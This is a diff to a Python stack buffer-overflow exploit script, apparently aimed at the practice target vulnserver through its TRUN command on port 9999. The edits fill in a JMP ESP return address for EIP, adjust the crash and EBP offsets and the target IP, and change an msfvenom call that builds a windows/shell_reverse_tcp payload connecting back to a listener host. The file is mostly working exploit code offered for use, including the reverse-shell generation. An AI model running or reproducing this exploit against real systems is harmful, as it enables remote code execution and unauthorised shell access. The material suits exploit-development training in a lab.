@@ -13,13 +13,13 @@ logging.basicConfig(filename='logs',
                     datefmt='%d/%m/%Y %I:%M:%S %p')
 
 init(autoreset=True) # Colorama auto reset settings
-IP = ('192.168.1.108').encode('latin-1') # Update your Remote IP Address
-CRASH = 3000 # Size of the total payload when EXE crashed
+IP = ('192.168.0.110').encode('latin-1') # Update your Remote IP Address
+CRASH = 2100 # Size of the total payload when EXE crashed
 PORT = 9999 # Remote Port where the EXE is listening
-EBP = 2003 # Total Size of the EBP
-EIP = "" # Address of JMP ESP to be replaced in EIP
+EBP = 1978 # Total Size of the EBP
+EIP = '\x50\x11\xaf\x62' # Address of JMP ESP to be replaced in EIP
 NOPS = 30 # Size of NOPS
-cmd = "TRUN /.:/" # Name oof the Vulnerable variable
+cmd = "TRUN /.:/" # Name of the Vulnerable variable
 
 badcharlist = (
   "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
@@ -221,7 +221,7 @@ def shellcode(LHOST=None,LPORT=None):
             bd = bd.replace(",","\\")
             bd = bd[:-1]
             
-        shellcode = subprocess.run(["msfvenom -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
+        shellcode = subprocess.run(["msfvenom -a x86 -p windows/shell_reverse_tcp LHOST={} LPORT={} -b '{}' -f c EXITFUNC=thread --platform windows".format(LHOST,LPORT,bd) ], shell=True, stdout=subprocess.PIPE)
         shellcode = shellcode.stdout.decode('latin-1')
         shellcode = shellcode.split("\n",1)[1]
         shellcode = "".join([i[1:-1] for i in shellcode[:-2].split("\n")]).replace(r"\\x",r"\x")
@@ -261,7 +261,7 @@ if __name__ == '__main__':
 ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                                                  
         ''')
-        
+       
         parser = argparse.ArgumentParser()
         parser.add_argument('-c', help='Crash bytes size', action='store_true')
         parser.add_argument('-l', help='Length for sending a random pattern')
@@ -271,8 +271,13 @@ if __name__ == '__main__':
         parser.add_argument('-s', help='Generate Shellcode',action='store_true')
         parser.add_argument('--L', help='Local address for reverse shell')
         parser.add_argument('--P', help='Local Port for reverse shell')
+        # parser.add_argument('-ip', help='Target IP address')
+        # parser.add_argument('-p', help='Target Port')
         
         args = parser.parse_args()
+
+        # IP = args.ip.encode('latin-1')
+        # PORT = int(args.p)
         
         if args.c:
             logging.info('Performing Crash Operation')
